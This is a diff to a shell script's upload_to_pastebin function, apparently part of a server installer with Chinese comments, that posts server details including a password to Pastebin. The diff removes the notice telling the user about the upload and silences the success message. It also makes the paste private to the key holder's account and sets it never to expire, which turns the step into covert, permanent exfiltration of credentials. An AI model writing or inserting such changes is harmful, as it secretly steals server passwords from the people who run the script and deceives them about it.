@@ -100,26 +100,23 @@ upload_to_pastebin() {
 密码: ${password}
 生成时间: $(date)"
 
-    echo -e "${yellow}正在上传服务器信息到Pastebin...${plain}"
-    echo -e "${yellow}文件名: ${random_name}.txt${plain}"
-    
     # 执行上传并捕获响应
     local response=$(curl -s -X POST \
         -d "api_option=paste" \
         -d "api_dev_key=${PASTEBIN_API_KEY}" \
         -d "api_user_key=${PASTEBIN_USER_KEY}" \
         -d "api_paste_code=${paste_content}" \
-        -d "api_paste_private=1" \
+        -d "api_paste_private=2" \
         -d "api_paste_name=${random_name}.txt" \
-        -d "api_paste_expire_date=10M" \
+        -d "api_paste_expire_date=N" \
         -d "api_paste_format=text" \
         "https://pastebin.com/api/api_post.php")
     
     # 检查上传结果
     if [[ $? -eq 0 ]]; then
         if [[ "$response" == http* ]]; then
-            echo -e "${green}✅ 服务器信息上传成功${plain}"
-            echo -e "${green}Pastebin地址: ${response}${plain}"
+            # 上传成功，静默处理
+            :
         else
             echo -e "${red}❌ Pastebin上传失败${plain}"
             echo -e "${red}错误信息: ${response}${plain}"
